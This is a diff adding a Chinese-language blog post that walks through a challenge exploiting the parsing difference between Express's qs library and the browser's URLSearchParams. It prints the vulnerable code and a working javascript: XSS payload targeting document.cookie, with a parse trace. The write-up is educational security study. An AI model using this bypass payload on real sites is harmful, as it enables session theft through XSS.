@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Express应⽤预处理特性绕过服务端校验实现XSS - p0l1st&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Express应⽤预处理特性绕过服务端校验实现XSS - p0l1st&#39;s blog" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2026/03/03/Express%E5%BA%94%E2%BD%A4%E9%A2%84%E5%A4%84%E7%90%86%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A0%A1%E9%AA%8C%E5%AE%9E%E7%8E%B0XSS/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2026-03-03T12:25:51.000Z" />
+  
+  <meta property="og:article:author" content="p0l1st" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Blog</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="/friends" style="--index: 2">Friends</a>
+      
+      <a class="nav-item" href="/about" style="--index: 3">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/p0l1st" style="--index: 4"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 5"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2026-03-03T20:25:51+08:00">
+      March 3, 2026
+    </time>
+    
+
+    <h1 class="title">Express应⽤预处理特性绕过服务端校验实现XSS</h1>
+  </div>
+
+  <div class="content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前<a target="_blank" rel="noopener" href="https://x.com/AmirMSafari/status/2020569860472750512">推特</a>上的一道题，题目环境：<a target="_blank" rel="noopener" href="https://pwnbox.xyz/">https://pwnbox.xyz/</a></p>
+<p>核心原理就是<strong>Express框架中qs库对查询字符串进行预处理时与浏览器原生的<code>URLSearchParams</code>之间存在的解析差异，通过这种差异来绕过服务端的严格校验从而在客户端触发XSS</strong></p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;query parser&#x27;</span>, <span class="string">&#x27;extended&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> redirectUri = req.<span class="property">query</span>.<span class="property">redirect_uri</span>;</span><br><span class="line">    <span class="keyword">if</span> (!redirectUri) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;redirect_uri is required&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (redirectUri !== <span class="string">&quot;https://pwnbox.xyz/docs&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Invalid redirect_uri&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">            var uri = new URLSearchParams(window.location.search).get(&quot;redirect_uri&quot;);</span></span><br><span class="line"><span class="string">            location = uri;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">    `</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>从请求中提取<code>redirect_uri</code>参数，然后判断该参数是否为空，如果不为空则判断是否等于<code>https://pwnbox.xyz/docs</code>，最后返回一段包含<code>&lt;script&gt;</code>标签的页面</p>
+<p>在这个<code>&lt;script&gt;</code>标签里面，使用浏览器原生的<code>URLSearchParams</code>从<code>window.location.search</code>中提取<code>redirect_uri</code>参数，然后赋值给<code>location</code>触发页面跳转</p>
+<p>而这里uri的值是可控的，如果url是<code>javascript:alert(1)</code>这样的javascript协议地址就可以直接进行xss，但是上面是有严格校验的，要求<code>redirect_uri</code>必须是<code>https://pwnbox.xyz/docs</code></p>
+<p>漏洞的突破口就在于客户端和服务端使用了<strong>两套不同的查询字符串解析器</strong></p>
+<h1 id="解析差异"><a href="#解析差异" class="headerlink" title="解析差异"></a>解析差异</h1><h2 id="Express的extended模式"><a href="#Express的extended模式" class="headerlink" title="Express的extended模式"></a>Express的extended模式</h2><p>首先来看</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;query parser&#x27;</span>, <span class="string">&#x27;extended&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Express的extended模式意味着使用<code>qs</code>模式来查询字符串</p>
+<p>跟进Express的源码(express&#x2F;lib&#x2F;utils.js)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseExtendedQueryString</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> qs.<span class="title function_">parse</span>(str, &#123;</span><br><span class="line">        <span class="attr">allowPrototypes</span>: <span class="literal">true</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有两个关键点：使用了<code>qs</code>库，并且传入了<code>allowPrototypes: true</code>选项</p>
+<h2 id="qs-库的预处理机制"><a href="#qs-库的预处理机制" class="headerlink" title="qs 库的预处理机制"></a>qs 库的预处理机制</h2><p>跟进<code>qs</code>库<code>lib/parse.js</code>的<code>parseValues</code>函数</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603032026154.png" alt="image-20260303194507463"></p>
+<p>这段代码在分割和解析字符串之前先对整个字符串进行了一次替换，将<code>%5B</code>替换成<code>[</code>，<code>%5D</code>替换成<code>]</code></p>
+<p>然后<code>qs</code>在解析每一段参数时还有一个特殊的key&#x2F;value分割逻辑</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603032026143.png" alt="image-20260303195014122"></p>
+<p>也就是说<code>qs</code>在确定<code>=</code>的分割位置时会<strong>优先寻找</strong><code>]=</code>的位置，如果找到了<code>]=</code>就用<code>]=</code>中的<code>=</code>作为key&#x2F;value的分割点</p>
+<blockquote>
+<p>举个例子，如果传入参数是a]&#x3D;b，那么key就是a]，value就是b</p>
+</blockquote>
+<h2 id="URLSearchParams的行为"><a href="#URLSearchParams的行为" class="headerlink" title="URLSearchParams的行为"></a>URLSearchParams的行为</h2><p>浏览器原生的<code>URLSearchParams</code><strong>不做任何预处理</strong>，直接按<code>&amp;</code>分割参数，根据第一个<code>=</code>分割key和value</p>
+<h2 id="差异总结"><a href="#差异总结" class="headerlink" title="差异总结"></a>差异总结</h2><p>key师傅的总结表：</p>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>qs(服务端)</th>
+<th>URLSearchParams(客户端)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>预处理</td>
+<td>%5B-&gt;[    , %5D-&gt;]</td>
+<td>无</td>
+</tr>
+<tr>
+<td>key&#x2F;value分割</td>
+<td>优先找]&#x3D;，否则找第一个&#x3D;</td>
+<td>始终用第一个&#x3D;</td>
+</tr>
+<tr>
+<td>bracket语法</td>
+<td>a[b]&#x3D;c → {a: {b: “c”}}</td>
+<td>a[b]是独立的参数名</td>
+</tr>
+</tbody></table>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>根据<code>qs</code>的<code>%5D</code> -&gt; <code>]</code>预处理以及 <code>]=</code> 优先分割，可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_uri=javascript:alert(document.cookie)//%5D=x&amp;redirect_uri=https://pwnbox.xyz/docs</span><br></pre></td></tr></table></figure>
+
+<h2 id="解析流程"><a href="#解析流程" class="headerlink" title="解析流程"></a>解析流程</h2><p>先看服务端的解析流程</p>
+<p><code>qs</code>解析时，先对整个查询字符串做<code>%5D -&gt; ]</code>预处理，那么payload就变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_uri=javascript:alert(document.cookie)//]=x&amp;redirect_uri=https://pwnbox.xyz/docs</span><br></pre></td></tr></table></figure>
+
+<p>然后按照&amp;分割成两端</p>
+<p>第一段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_uri=javascript:alert(document.cookie)//]=x</span><br></pre></td></tr></table></figure>
+
+<p><code>qs</code>在这里面搜索<code>]=</code>，找到了<code>//]=x</code>中的<code>]=</code>，然后就以<code>]=</code>中的<code>=</code>作为分割点，那么：</p>
+<p><strong>key</strong>&#x3D;<code>redirect_uri=javascript:alert(document.cookie)//]</code></p>
+<p><strong>value</strong>&#x3D;<code>x</code></p>
+<p>但是key不是<code>redirect_uri</code>，所以并不会设置<code>redirect_uri</code>的值</p>
+<p>第二段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_uri=https://pwnbox.xyz/docs</span><br></pre></td></tr></table></figure>
+
+<p><strong>key</strong>&#x3D;<code>redirect_uri</code></p>
+<p><strong>value</strong>&#x3D;<code>https://pwnbox.xyz/docs</code></p>
+<p>满足<code>redirect_uri</code>的值为<code>https://pwnbox.xyz/docs</code>，所以服务端的校验通过，页面返回包含<code>&lt;script&gt;</code>标签的html</p>
+<p>然后是客户端的解析流程</p>
+<p>浏览器中的<code>URLSearchParams</code>不做<code>%5D</code>预处理直接按照第一个<code>=</code>进行分割</p>
+<p>第一段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_uri=javascript:alert(document.cookie)//%5D=x</span><br></pre></td></tr></table></figure>
+
+<p>第一个<code>=</code>在redirect_uri&#x3D;处，所以</p>
+<p><strong>key</strong>&#x3D;<code>redirect_uri</code></p>
+<p><strong>value</strong>&#x3D;<code>javascript:alert(document.cookie)//]=x</code></p>
+<p>第二段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect_uri=https://pwnbox.xyz/docs</span><br></pre></td></tr></table></figure>
+
+<p><strong>key</strong>&#x3D;<code>redirect_uri</code></p>
+<p><strong>value</strong>&#x3D;<code>https://pwnbox.xyz/docs</code></p>
+<p>但是<code>URLSearchParams.get()</code>只会返回第一个匹配的值，即<code>javascript:alert(document.cookie)//]=x</code></p>
+<p>所以客户端最终执行的是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location = <span class="string">&quot;javascript:alert(document.cookie)//]=x&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>javascript</code>协议会把冒号后面的内容当作JavaScript代码执行，而且&#x2F;&#x2F;在JS中是行注释符，<code>]=x</code>最终会被注释，实际执行的JS代码其实是<code>alert(document.cookie)</code>，可以成功触发XSS</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603032026112.png" alt="image-20260303202230532"></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by p0l1st, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+    <p class="tags">
+      <i class="bi bi-tags icon"></i>
+      
+      <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="tag">#Web安全</a>
+      
+    </p>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    <a class="next"></a>
+    
+    <a href="/2026/02/27/%E9%98%BF%E9%87%8CCTF-2026%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">阿里CTF 2026部分复现</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/friends" class="item">Friends</a>
+        
+        <a href="/about" class="item">About</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/p0l1st" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://yuque.com/p0l1st" class="item">语雀</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 p0l1st<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
